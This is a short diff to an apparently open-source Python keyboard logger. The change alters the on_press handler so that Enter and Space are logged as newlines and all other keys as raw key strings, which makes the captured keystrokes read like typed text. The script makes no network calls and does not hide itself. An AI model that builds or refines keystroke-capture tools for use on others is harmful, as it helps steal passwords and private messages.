@@ -46,8 +46,12 @@ def on_press(key):
         print("STOPPED KEYBOARD LOGGER")
         return False
     else:
-        print("Key '{0}' was pressed".format(key))
-        key_logger.info("Key '{0}' was pressed".format(key))
+        if key == keyboard.Key.enter or key == keyboard.Key.space:
+            key_logger.info("\n")
+            print("\n")
+        else:
+            key_logger.info(str(key))
+            print(str(key))
 
 
 # Collect all Events
